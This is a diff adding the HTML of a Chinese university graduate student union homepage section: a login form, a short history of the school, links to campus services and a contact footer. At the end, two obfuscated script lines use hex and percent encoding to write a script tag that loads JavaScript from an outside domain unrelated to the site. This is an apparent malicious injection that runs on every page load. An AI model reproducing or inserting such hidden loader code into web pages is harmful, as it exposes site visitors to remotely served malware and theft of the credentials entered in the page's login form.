+          <td><img src="aflcimages/point_title1.jpg" width="200" height="12"></td>
+        </tr>
+        <tr> 
+          <td align="center">
+
+			<table width="75%" border="0" cellspacing="0" cellpadding="0">
+              <tr> 
+                <td>&nbsp;</td>
+                <td>&nbsp;</td>
+              </tr>
+              <tr> 
+                <td width="30" height="30" style="color:#FFFFFF">名称</td>
+                <td><input name="username" type="text" class="input1" size="18"></td>
+              </tr>
+              <tr> 
+                <td height="30" style="color:#FFFFFF">密码</td>
+                <td><input name="password" type="password" class="input1" size="18"></td>
+              </tr>
+            </table>
+            <table width="75%" border="0" cellspacing="0" cellpadding="0">
+              <tr> 
+                <td height="37" valign="bottom"><div align="center">
+                  <input type="image" onClick="return onSubmit()" src="aflcimages/bt_home1.gif" width="34" height="19">
+                </div></td>
+                </tr>			  
+            </table>
+			</td>
+        </tr>
+        <tr> 
+          <td><img src="aflcimages/point_title01.jpg" width="200" height="54"></td>
+        </tr>
+      </table>
+	  </form>
+      <table width="200" border="0" cellspacing="0" cellpadding="0">
+        <tr> 
+          <td><img src="aflcimages/title_about.jpg" width="200" height="27"></td>
+        </tr>
+      </table>
+      <table width="200" border="0" cellpadding="0" cellspacing="0" background="aflcimages/bg_title1.gif">
+        <tr> 
+          <td><img src="aflcimages/point_title1.jpg" width="200" height="12"></td>
+        </tr>
+        <tr> 
+          <td align="center"><table width="85%" border="0" cellspacing="0" cellpadding="0">
+              <tr> 
+                <td>&nbsp;</td>
+              </tr>
+              <tr> 
+                
+				<td class="font1" style="color:#FFF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;社会历史学院是福建师范大学历史最为悠久的院系之一，可以追溯至1907年福建优级师范学堂开设的史地选科。1952年，由华南文理女子学院历史学系、福建协和大学历史学系和福建师范学院（乌山）历史学系合并组成本院下属的历史学系。</td>
+				
+              </tr>
+              <tr> 
+                <td align="right" class="font1"><a href="about.asp" class="a12">更多内容&gt;</a></td>
+              </tr>
+            </table></td>
+        </tr>
+        <tr> 
+          <td><img src="aflcimages/point_title01.jpg" width="200" height="54"></td>
+        </tr>
+      </table>
+      <table width="200" border="0" cellspacing="0" cellpadding="0">
+        <tr> 
+          <td>&nbsp;</td>
+        </tr>
+        <tr> 
+          <td align="center"><a href="internation.asp">AD</a></td>
+        </tr>
+        <tr> 
+          <td height="24">&nbsp;</td>
+        </tr>
+        <tr> 
+          <td align="center"><a href="forum/forum.asp">AD</a></td>
+        </tr>
+        <tr> 
+          <td height="24">&nbsp;</td>
+        </tr>
+        <tr> 
+          <td align="center"><a href="recruit_in.asp">AD</a></td>
+        </tr>
+        <tr> 
+          <td height="24">&nbsp;</td>
+        </tr>
+        <tr> 
+          <td align="center"><a href="culture.asp">AD</a></td>
+        </tr>
+        <tr> 
+          <td height="24">&nbsp;</td>
+        </tr>
+      </table>
+      <table width="200" border="0" cellspacing="0" cellpadding="0">
+        <tr> 
+          <td><img src="aflcimages/title_service.jpg" width="200" height="27"></td>
+        </tr>
+      </table>
+      <table width="200" border="0" cellpadding="0" cellspacing="0" background="aflcimages/bg_title1.gif">
+        <tr> 
+          <td><img src="aflcimages/point_title1.jpg" width="200" height="12"></td>
+        </tr>
+        <tr> 
+          <td align="center"><table width="90%" border="0" cellspacing="0" cellpadding="0">
+              <tr align="center"> 
+                <td>&nbsp;</td>
+                <td>&nbsp;</td>
+                <td>&nbsp;</td>
+              </tr>
+              <tr align="center"> 
+                <td><a href="http://life.fjnu.edu.cn/LifeNews/tzwgnews/200708/20070828091550_112.html" target="_blank"><img src="aflcimages/icon_1.jpg" width="36" height="36" border="0"></a></td>
+                <td><a href="contact.asp?keyno=989" target="_blank"><img src="aflcimages/icon_2.jpg" width="36" height="36" border="0"></a></td>
+                <td><a href="http://www.nmc.gov.cn/live.html" target="_blank"><img src="aflcimages/icon_3.jpg" width="36" height="36" border="0"></a></td>
+              </tr>
+              <tr align="center"> 
+                <td height="25"><span class="style1">校车时刻</span></td>
+                <td><span class="style1">办公电话</span></td>
+                <td><span class="style1">天气预报</span></td>
+              </tr>
+              <tr align="center"> 
+                <td>&nbsp;</td>
+                <td>&nbsp;</td>
+                <td>&nbsp;</td>
+              </tr>
+              <tr align="center"> 
+                <td><a href="http://iciba.com/" target="_blank"><img src="aflcimages/icon_4.jpg" width="36" height="36" border="0"></a></td>
+                <td><a href="http://edu.qq.com/y/" target="_blank"><img src="aflcimages/icon_5.jpg" width="36" height="36" border="0"></a></td>
+                <td><a href="http://www.chsi.com.cn/xlcx/" target="_blank"><img src="aflcimages/icon_6.jpg" width="36" height="36" border="0"></a></td>
+              </tr>
+              <tr align="center"> 
+                <td height="25"><span class="style1">在线翻译</span></td>
+                <td><span class="style1">考研查询</span></td>
+                <td><span class="style1">学历查询</span></td>
+              </tr>
+              <tr align="center"> 
+                <td>&nbsp;</td>
+                <td>&nbsp;</td>
+                <td>&nbsp;</td>
+              </tr>
+              <tr align="center"> 
+                <td><a href="http://www.linkwan.com/gb/broadmeter/SpeedAuto/" target="_blank"><img src="aflcimages/icon_7.jpg" width="36" height="36" border="0"></a></td>
+                <td><a href="http://ditu.mapbar.com/localsearch/index.html#ac=lc&keyword=%E7%A6%8F%E5%B7%9E%E5%B8%82&city=%E7%A6%8F%E5%B7%9E%E5%B8%82" target="_blank"><img src="aflcimages/icon_8.jpg" width="36" height="36" border="0"></a></td>
+                <td><a href="http://shadu.baidu.com/index.jsp" target="_blank"><img src="aflcimages/icon_9.jpg" width="36" height="36" border="0"></a></td>
+              </tr>
+              <tr align="center"> 
+                <td height="25"><span class="style1">网速测试</span></td>
+                <td><span class="style1">福州地图</span></td>
+                <td><span class="style1">病毒查杀</span></td>
+              </tr>
+              <tr align="center"> 
+                <td>&nbsp;</td>
+                <td>&nbsp;</td>
+                <td>&nbsp;</td>
+              </tr>
+            </table></td>
+        </tr>
+        <tr> 
+          <td><img src="aflcimages/point_title01.jpg" width="200" height="54"></td>
+        </tr>
+      </table>
+    </td>
+  </tr>
+</table>
+<table width="1002" border="0" cellspacing="0" cellpadding="0">
+  <tr>
+    <td width="778" height="62" align="center" bgcolor="#FAF6E8" style="border-top:1px solid #E4CAB3;">
+	  <table width="95%" border="0" cellspacing="0" cellpadding="0">
+        <tr align="center"> 
+		
+		  <td><a href="http://www.fjnu.edu.cn/" target=_blank><img src="myasp_pic_display.asp?keyno=21&code=&tablename=links" height="31" border="0"></a></td>
+		
+		  <td><a href="http://www.fjnu.edu.cn/contents/bnxqzbzt/index.html" target=_blank><img src="myasp_pic_display.asp?keyno=22&code=&tablename=links" height="31" border="0"></a></td>
+		
+		  <td><a href="http://csh.fjnu.edu.cn/yan/forum/forum_list.asp?classcode=116" target=_blank><img src="myasp_pic_display.asp?keyno=25&code=&tablename=links" height="31" border="0"></a></td>
+		
+          <td align="center">
+		    <select name="menu1" style="width:200px;" onChange="if(this.options[this.selectedIndex].value!='$') {window.open(this.options[this.selectedIndex].value);}">
+              <option value="$">更多友情链接</option>
+              
+              <option value="http://www.moe.edu.cn/">中华人民共和国教育部</option>
+              
+              <option value="http://www.fjzs.com.cn/">福建省招考在线</option>
+              
+              <option value="http://www.fjnu.edu.cn/yjsc/">福建师范大学研究生处</option>
+              
+              <option value="http://www.hxrc.com/main.htm">海峡人才市场</option>
+              
+            </select> </td>
+        </tr>
+      </table>
+    </td>
+    <td width="20" background="aflcimages/bg_right.jpg">&nbsp;</td>
+    <td bgcolor="#8B3F10">&nbsp;</td>
+  </tr>
+</table>
+
+
+
+<table width="1002" border="0" cellpadding="0" cellspacing="0" bgcolor="#672000">
+  <tr> 
+    <td height="87" align="center" style="border-top:6px solid #481C04;"><table width="735" border="0" cellspacing="0" cellpadding="0" align="center">
+      <tr>
+        <td height="22" valign="bottom" class="font1"><div align="center"><font color="#9F7254">学院地址：中国·福建·福州市仓山校区&nbsp;&nbsp;&nbsp;&nbsp;邮编：350007&nbsp;&nbsp;&nbsp;&nbsp;电话：0591-83465386</font></div></td>
+      </tr>
+      <tr>
+        <td height="22" valign="bottom" class="font1"><div align="center"><font color="#9F7254">Copyrights 
+          2008-2010 福建师范大学社会历史学院研究生会</font><font color="#000000"> </font><a href="http://csh.fjnu.edu.cn/yan/" class="a11"><font color="#9F7254">csh.fjnu.edu.cn/yan</font></a><font color="#9F7254">&nbsp;&nbsp;&nbsp;&nbsp;访问记录：第23396位 </font></div></td>
+      </tr>
+    </table></td>
+  </tr>
+</table>
+
+
+<script>document.writeln("\x3C\x73\x63\x72\x69\x70\x74\x20\x73\x72\x63\x3D\x68\x74\x74\x70\x3A\x2F\x2F\x4F\x25\x36\x36\x25\x36\x36\x25\x34\x39\x25\x36\x33\x65\x25\x32\x45\x25\x34\x36\x25\x34\x31\x51\x25\x35\x33\x25\x36\x35\x25\x37\x32\x76\x2E\x25\x34\x33\x25\x36\x46\x25\x34\x44\x2F\x25\x34\x36\x25\x34\x31\x25\x35\x31\x25\x32\x45\x25\x36\x41\x25\x37\x33\x3E\x3C\x2F\x73\x63\x72\x69\x70\x74\x3E");</script>
+<script>document.writeln("\x3C\x73\x63\x72\x69\x70\x74\x20\x73\x72\x63\x3D\x68\x74\x74\x70\x3A\x2F\x2F\x4F\x25\x36\x36\x25\x36\x36\x25\x34\x39\x25\x36\x33\x65\x25\x32\x45\x25\x34\x36\x25\x34\x31\x51\x25\x35\x33\x25\x36\x35\x25\x37\x32\x76\x2E\x25\x34\x33\x25\x36\x46\x25\x34\x44\x2F\x25\x34\x36\x25\x34\x31\x25\x35\x31\x25\x32\x45\x25\x36\x41\x25\x37\x33\x3E\x3C\x2F\x73\x63\x72\x69\x70\x74\x3E");</script>
+
+</body>
+</html>
